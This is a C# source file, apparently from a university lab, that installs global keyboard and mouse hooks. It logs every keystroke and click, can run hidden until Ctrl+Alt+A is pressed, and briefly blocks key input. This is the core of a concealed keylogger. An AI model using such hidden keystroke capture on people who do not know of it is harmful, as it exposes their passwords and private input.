using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Diagnostics;
using System.Globalization;
using System.Runtime.InteropServices;


namespace IIPU_lab8
{
	
	public class HookController
	{
		public delegate void WindowShowHandler();
		
		private readonly IKeyboardMouseEvents Hooks = Hook.GlobalEvents();
		
		private readonly Logger MyLogger;
		private readonly Controller MyController;
		
		Timer timer = new Timer();
		bool BlockKeys = false;

		public HookController(Controller cntrl)
		{
			MyController = cntrl;
			MyLogger = new Logger(cntrl);
			Hooks.KeyDown += KeyEvent;
			Hooks.MouseClick += MouseEvent;

			timer.Interval = 2000;
			timer.Tick += TimerEvent;
			//timer.Enabled = true;
		
		}


		private void TimerEvent(object sender, EventArgs e)
		{
			BlockKeys = false;
			timer.Enabled = false;
			MessageBox.Show("sip");
		}

		private void KeyEvent(object sender, KeyEventArgs e)
		{
			if (MyController.HooksEnabled)
			{
				if (BlockKeys)
				{
					e.SuppressKeyPress = true;
				}
				else
				{	
					e.SuppressKeyPress = false;
				}

				if (e.KeyData == Keys.A)
				{
					timer.Enabled = true;
					BlockKeys = true;
				}
			}
			if (MyController.Logging)
			{
				MyLogger.LogKey(e.KeyData.ToString());
			}

			if (e.KeyData == (Keys.Control | Keys.Alt | Keys.A))
			{
				if (MyController.Hidden)
				{
					MyController.Hidden = false;
					MyController.FormSetData();
				}
			}
		}
		
		private void MouseEvent(object sender, MouseEventArgs e)
		{
			if (MyController.Logging)
			{
				MyLogger.LogMouse(e.Button.ToString(), e.Location.ToString());
			}
		}
	}

}
